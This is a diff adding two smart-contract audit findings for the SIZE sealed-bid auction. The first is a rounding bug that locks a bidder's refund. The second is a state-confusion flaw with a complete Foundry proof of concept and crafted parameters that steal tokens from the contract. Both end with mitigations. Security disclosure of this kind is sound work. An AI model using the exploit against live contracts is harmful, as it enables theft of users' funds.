@@ -1,0 +1,65 @@
+[H-01] Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn’t have enough balance.
+Submitted byhansfriese, also found byktg
+Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn’t have enough balance.
+The main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.
+If there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn’t have enough balance of quote token.
+Proof of Concept
+After the auction was finalized, the seller receives thefilledQuoteamount of quote token usingdata.filledBase.
+// Calculate quote amount based on clearing priceuint256filledQuote=FixedPointMathLib.mulDivDown(clearingQuote,data.filledBase,clearingBase);
+But when the bidders withdraw the funds usingwithdraw(), they offer the quote tokenusing this formula.
+// Refund unfilled quoteAmount on first withdrawif(b.quoteAmount!=0) {uint256quoteBought=FixedPointMathLib.mulDivDown(baseAmount,a.data.lowestQuote,a.data.lowestBase);uint256refundedQuote=b.quoteAmount-quoteBought;b.quoteAmount=0;SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken),msg.sender,refundedQuote);}
+Even if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.
+This is the test to show the scenario.
+functiontestAuditBidderMoneyLock()public{// in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a selleruint128K=1ether;baseToSell=4*K;uint256aid=seller.createAuction(baseToSell,reserveQuotePerBase,minimumBidQuote,startTime,endTime,unlockTime,unlockEnd,cliffPercent);bidder1.setAuctionId(aid);bidder1.bidOnAuctionWithSalt(3*K,3*K+2,"Honest bidder");bidder2.setAuctionId(aid);bidder2.bidOnAuctionWithSalt(2*K,2*K+1,"Honest bidder");vm.warp(endTime);uint256[]memorybidIndices=newuint[](2);bidIndices[0] =0;bidIndices[1] =1;seller.finalize(bidIndices,2*K,2*K+1);emitlog_string("Seller claimed");// seller claimed 4*K+2assertEq(quoteToken.balanceOf(address(seller)),4*K+2);// contract has K+1 quote token leftassertEq(quoteToken.balanceOf(address(auction)),K+1);// bidder1 withdrawsbidder1.withdraw();emitlog_string("Bidder 1 withdrew");// contract has K quote token leftassertEq(quoteToken.balanceOf(address(auction)),K);// bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens// but the protocol reverts because of insufficient quote tokensbidder2.withdraw();emitlog_string("Bidder 2 withdrew");// will not happen}
+The test result shows the seller charged more quote token than the bidders offer so the last bidder can’t withdraw his unused quote token because the contract doesn’t have enough balance.
+Running1testforsrc/test/SizeSealed.t.sol:SizeSealedTest[FAIL.Reason:TRANSFER_FAILED]testAuditBidderMoneyLock() (gas:954985)Logs:Seller claimedBidder 1 withdrewTest result: FAILED. 0 passed; 1 failed; finished in 6.94msFailing tests:Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest[FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas:954985)
+Tools Used
+Foundry
+Recommended Mitigation Steps
+Currently, theFinalizeDatastruct contains thefilledBaseonly and calculates thefilledQuoteusing the clearing price.
+structFinalizeData{uint256reserveQuotePerBase;uint128totalBaseAmount;uint128filledBase;uint256previousQuotePerBase;uint256previousIndex;}
+I think we should add one more fieldfilledQuoteand update it during auction finalization.
+And the seller can recieve the sum offilledQuoteof all bidders to avoid the rounding issue.
+Also, each bidder can pay thefilledQuoteof quote token and receive thefilledBaseof base token without calculating again using the clearing price.
+RagePit (SIZE) confirmed
+
+[H-02] Attacker can steal any funds in the contract by state confusion (no preconditions)
+Submitted byTrust, also found byV_B,cryptonue,PwnedNoMore,KIntern_NA,fs0c,cryptphi,bin2chen,JTJabba,HE1M,Picodes,hansfriese,KingNFT,R2,M4TZ1P, and8olidity
+HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions).LOC:https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238
+Auctions in SIZE can be in one of several states, as checked in the atState() modifier:
+modifier atState(Auction storage a, States _state) {if (block.timestamp < a.timings.startTimestamp) {if (_state != States.Created) revert InvalidState();} else if (block.timestamp < a.timings.endTimestamp) {if (_state != States.AcceptingBids) revert InvalidState();} else if (a.data.lowestQuote != type(uint128).max) {if (_state != States.Finalized) revert InvalidState();} else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {if (_state != States.RevealPeriod) revert InvalidState();} else if (block.timestamp > a.timings.endTimestamp + 24 hours) {if (_state != States.Voided) revert InvalidState();} else {revert();}_;}
+It’s important to note that if current block timestamp is greater than endTimestamp,a.data.lowestQuoteis used to determine if finalize() was called.
+The value is set to max at createAuction.
+In finalize, it is set again, using user-controlled input:
+// Last filled bid is the clearing pricea.data.lowestBase = clearingBase;a.data.lowestQuote = clearingQuote;
+The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote totype(uint128).max. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:
+// Transfer the left over baseTokenif (data.totalBaseAmount != data.filledBase) {uint128 unsoldBase = data.totalBaseAmount - data.filledBase;a.params.totalBaseAmount = data.filledBase;SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase);}// Calculate quote amount based on clearing priceuint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote);
+Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:
+function cancelAuction(uint256 auctionId) external {Auction storage a = idToAuction[auctionId];if (msg.sender != a.data.seller) {revert UnauthorizedCaller();}// Only allow cancellations before finalization// Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)if (a.data.lowestQuote != type(uint128).max) {revert InvalidState();}// Allowing bidders to cancel bids (withdraw quote)// Auction considered forever States.AcceptingBids but nobody can finalizea.data.seller = address(0);a.timings.endTimestamp = type(uint32).max;emit AuctionCancelled(auctionId);SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount);}function cancelBid(uint256 auctionId, uint256 bidIndex)external{Auction storage a = idToAuction[auctionId];EncryptedBid storage b = a.bids[bidIndex];if (msg.sender != b.sender) {revert UnauthorizedCaller();}// Only allow bid cancellations while not finalized or in the reveal periodif (block.timestamp >= a.timings.endTimestamp) {if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {revert InvalidState();}}// Prevent any futher access to this EncryptedBidb.sender = address(0);// Prevent seller from finalizing a cancelled bidb.commitment = 0;emit BidCancelled(auctionId, bidIndex);SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);}
+The attack will look as follows:
+attacker uses two contracts - buyer and sellerseller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens.buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X.after 1 second, seller calls reveal() and finalizes, withlowestQuote = lowestBase = 2**128-1.seller contract receives X-Y unsold base tokens and Y quote tokensseller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp =type(uint32).maxbuyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens.The accounting shows attacker profited Y quote tokens, which are both in buyer and seller’s contract.
+Note that the values ofminimumBidQuote,reserveQuotePerbasemust be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.
+This was the main constraint to bypass:
+uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);...data.previousQuotePerBase = quotePerBase;...if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {revert InvalidCalldata();}
+Since clearingQuote must equal UINT128_MAX, we must satisfy:
+(2**128-1) * (2**128-1) / clearingBase = quoteAmount * (2**128-1) / baseAmount. The solution I found was setting clearingBase to (2**128-1) and quoteAmount = baseAmount.
+We also have constraints on reserveQuotePerBase. In createAuction:
+if (FixedPointMathLib.mulDivDown(auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount) > auctionParams.reserveQuotePerBase) {revert InvalidReserve();}
+While in finalize():
+// Only fill if above reserve priceif (quotePerBase < data.reserveQuotePerBase) continue;
+And an important constraint on quoteAmount and minimumBidQuote:
+if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {revert InvalidBidAmount();}
+Merging them gives us two equations to substitute variables in:
+minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBasequoteAmount > minimumBidQuote
+In the POC I’ve crafted parameters to steal 2**30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.
+Impact
+An attacker can steal all tokens held in the SIZE auction contract.
+Proof of Concept
+Copy the following code in SizeSealed.t.sol
+function testAttack() public {quoteToken = new MockERC20("USD Coin", "USDC", 6);baseToken = new MockERC20("DAI stablecoin ", "DAI", 18);// Bootstrap auction contract with some fundsbaseToken.mint(address(auction), 1e20);quoteToken.mint(address(auction), 1e12);// Create attackerMockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);// Print attacker balancesuint256 balance_quote;uint256 balance_base;(balance_quote, balance_base) = attacker_seller.balances();console.log("Starting seller balance: ", balance_quote, balance_base);(balance_quote, balance_base) = attacker_buyer.balances();console.log('Starting buyer balance: ', balance_quote, balance_base);// Create auctionuint256 auction_id = attacker_seller.createAuction(2**32,  // totalBaseAmount2**120, // reserveQuotePerBase2**20, // minimumBidQuoteuint32(block.timestamp), // startTimestampuint32(block.timestamp + 1),  // endTimestampuint32(block.timestamp + 1), // vestingStartTimestampuint32(block.timestamp + 1), // vestingEndTimestamp0 // cliffPercent);// Bid on auctionattacker_buyer.setAuctionId(auction_id);attacker_buyer.bidOnAuction(2**30, // baseAmount2**30  // quoteAmount);// Finalize with clearingQuote = clearingBase = 2**128-1// Will transfer unsold base amount + matched quote amountuint256[] memory bidIndices = new uint[](1);bidIndices[0] = 0;vm.warp(block.timestamp + 10);attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);// Cancel auction// Will transfer back sold base amountattacker_seller.cancelAuction();// Cancel bid// Will transfer back to buyer quoteAmountattacker_buyer.cancel();// Net profit of quoteAmount tokens of quoteToken(balance_quote, balance_base) = attacker_seller.balances();console.log("End seller balance: ", balance_quote, balance_base);(balance_quote, balance_base) = attacker_buyer.balances();console.log('End buyer balance: ', balance_quote, balance_base);}
+Tools Used
+Manual audit, foundry tests
+Recommended Mitigation Steps
+Do not trust the value oflowestQuotewhen determining the finalize state, use a dedicated state variable for it.
+RagePit (SIZE) confirmed
+
